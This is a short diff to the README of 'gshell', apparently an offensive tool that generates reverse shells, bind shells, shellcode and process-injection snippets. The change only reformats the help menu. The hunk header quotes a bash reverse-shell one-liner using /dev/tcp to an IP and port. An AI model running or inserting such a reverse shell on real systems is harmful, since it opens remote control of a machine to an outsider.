@@ -107,9 +107,9 @@ bash -i >& /dev/tcp/$ip/$port 0>&1
 This is the help menu:
 
 ```powershell
-PS C:\gshell> python gshell.py -h                                    
-usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--linux] [--base64] [--base32]
-                 [--base16] [--url] [--no-block] [-l] [-a] [-h]
+PS C:\gshell> python gshell.py -h
+usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--shellcode] [--srev] [--sbind] [--linux] [--base64] [--base32] [--base16] [--url]
+                 [--no-block] [-l] [-a] [-h]
 
  ██████  ███████ ██   ██ ███████ ██      ██
 ██       ██      ██   ██ ██      ██      ██
@@ -140,7 +140,7 @@ Snippets Types:
   --injector            Print process injector code snippets
 
 Shellcode Required Options:
-  --shellcode           Generate shellcodes, requires --srev or --sbind and --windows or --linux
+  --shellcode           Generate shellcodes, requires --srev or --sbind and --linux
   --srev                Reverse shell shellcode
   --sbind               Bind shell shellcode
   --linux               Linux shellcode
